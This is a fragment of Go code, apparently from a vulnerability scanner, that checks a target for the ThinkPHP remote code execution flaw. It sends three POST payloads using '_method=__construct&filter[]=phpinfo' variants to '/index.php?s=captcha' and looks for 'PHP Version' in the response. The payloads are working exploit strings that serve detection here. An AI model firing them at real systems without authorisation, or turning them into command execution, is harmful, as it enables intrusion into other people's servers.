...
func RCE(u string) bool {
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=1", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
	}
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", "_method=__construct&method=GET&filter[]=phpinfo&get[]=1", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
	}
	if req, err := util.HttpRequset(u+"/index.php?s=captcha", "POST", "s=1&_method=__construct&method&filter[]=phpinfo", false, nil); err == nil {
		if util.StrContains(req.Body, "PHP Version") {
			util.GoPocLog(fmt.Sprintf("Found vuln ThinkPHP RCE|\"%s\"\n", u+"/index.php?s=captcha"))
			return true
		}
